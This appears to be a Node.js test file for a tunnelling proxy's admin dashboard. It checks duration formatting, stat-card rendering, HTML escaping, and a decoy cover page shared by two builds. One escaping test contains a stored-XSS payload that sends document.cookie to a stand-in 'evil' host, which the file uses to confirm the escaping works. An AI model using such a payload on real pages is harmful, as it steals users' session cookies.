'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');

const { FAKE_INDEX_HTML, renderStatsPage, escapeHtml, formatDuration } = require('../src/node/pages.js');
const decoy = require('../src/decoy.js');

function snapshot(over = {}) {
  return {
    uptimeSeconds: 3661,
    totalConnections: 5,
    activeConnections: 2,
    totalStreams: 9,
    activeStreams: 3,
    totalBytesTx: 1024 * 1024 * 2,
    totalBytesRx: 1024 * 1024 * 3,
    active: [],
    history: [],
    ...over
  };
}

test('formatDuration renders hh:mm:ss', () => {
  assert.equal(formatDuration(0), '00:00:00');
  assert.equal(formatDuration(59), '00:00:59');
  assert.equal(formatDuration(3661), '01:01:01');
  assert.equal(formatDuration(360000), '100:00:00');
});

test('renderStatsPage is pure and renders the eight stat cards', () => {
  const html = renderStatsPage(snapshot(), '/tunnel');
  assert.equal((html.match(/<div class="stat-card">/g) || []).length, 8);
  assert.match(html, /01:01:01/, 'uptime');
  assert.match(html, /2\.00 MB/, 'MB sent');
  assert.match(html, /3\.00 MB/, 'MB received');
  assert.match(html, />\/tunnel</, 'ws path');

  // Same input, same output — no hidden state.
  assert.equal(renderStatsPage(snapshot(), '/tunnel'), html);
});

test('renderStatsPage shows empty states with no connections', () => {
  const html = renderStatsPage(snapshot(), '/');
  assert.match(html, /No active connections/);
  assert.match(html, /No connection history/);
});

test('renderStatsPage lists active and closed connections', () => {
  const html = renderStatsPage(snapshot({
    active: [{ id: 1, durationSeconds: 65, streams: 2, lastHost: 'example.com:443', lastProto: 'TCP' }],
    history: [{ id: 2, durationSeconds: 5, streams: 1, lastHost: '1.1.1.1:53', lastProto: 'UDP' }]
  }), '/');

  assert.match(html, /#1/);
  assert.match(html, /example\.com:443/);
  assert.match(html, /00:01:05/);
  assert.match(html, /badge-tcp/);

  assert.match(html, /#2/);
  assert.match(html, /1\.1\.1\.1:53/);
  assert.match(html, /badge-udp/);
});

test('escapeHtml neutralises the HTML metacharacters', () => {
  assert.equal(escapeHtml('<script>'), '&lt;script&gt;');
  assert.equal(escapeHtml('a&b'), 'a&amp;b');
  assert.equal(escapeHtml('"quoted"'), '&quot;quoted&quot;');
  assert.equal(escapeHtml("it's"), 'it&#39;s');
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(undefined), '');
});

test('a hostile destination hostname cannot inject markup into the dashboard', () => {
  // lastHost comes from the tunnel destination, i.e. from whoever is using the
  // proxy — this is the stored-XSS case on the token-gated admin page.
  const payload = '<script>fetch("//evil/"+document.cookie)</script>';
  const html = renderStatsPage(snapshot({
    active: [{ id: 1, durationSeconds: 1, streams: 1, lastHost: payload, lastProto: payload }]
  }), '/');

  assert.ok(!html.includes('<script>fetch'), 'raw script tag must not survive');
  assert.match(html, /&lt;script&gt;fetch/);
});

test('the ws path cannot inject markup either', () => {
  const html = renderStatsPage(snapshot(), '/"><script>x</script>');
  assert.ok(!html.includes('<script>x</script>'));
});

test('the decoy page is byte-identical across the Node and Worker builds', async () => {
  const worker = await import('../src/worker/pages.mjs');
  assert.equal(FAKE_INDEX_HTML, decoy.FAKE_INDEX_HTML);
  assert.equal(worker.FAKE_INDEX_HTML, decoy.FAKE_INDEX_HTML,
    'both builds must serve the same cover site');
});
